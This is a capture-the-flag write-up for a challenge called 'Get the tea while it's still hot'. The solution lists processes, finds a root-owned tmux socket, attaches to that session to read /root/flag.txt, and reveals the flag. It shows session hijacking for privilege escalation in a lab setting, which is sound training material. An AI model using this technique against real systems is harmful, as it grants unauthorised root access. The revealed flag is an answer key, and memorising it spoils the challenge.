#### Challenge:

Get the tea while it's still hot! <br><br> <b>Open the <code>Deployment</code> tab to start this challenge.</b>

---

#### Solution:

```console
bash-4.4$ busybox ps
busybox ps
PID   USER     TIME   COMMAND
    1 root       0:00 socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/.controller,st
   16 root       0:00 {tmux: server} tmux -S /tmp/tmux-0/tea_mix new-session -d
   17 root       0:00 ash -c bash -i
   19 root       0:00 bash -i
   38 challeng   0:00 python3 -c import pty; pty.spawn("""/bin/bash""")
   39 challeng   0:00 /bin/bash
   48 root       0:00 socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/.controller,st
   49 root       0:00 {.controller} /bin/bash /.controller
   50 challeng   0:00 python3 -c import pty; pty.spawn("""/bin/bash""")
   51 challeng   0:00 /bin/bash
   52 challeng   0:00 busybox ps
```

```bash
TERM=tmux tmux -S /tmp/tmux-0/tea_mix a -t tea_mix
cat /root/flag.txt
```

---

<details><summary>FLAG:</summary>

```
flag{oooohhhh_tea_mix_sounds_like_tmux_i_get_it}
```

</details>
<br/>
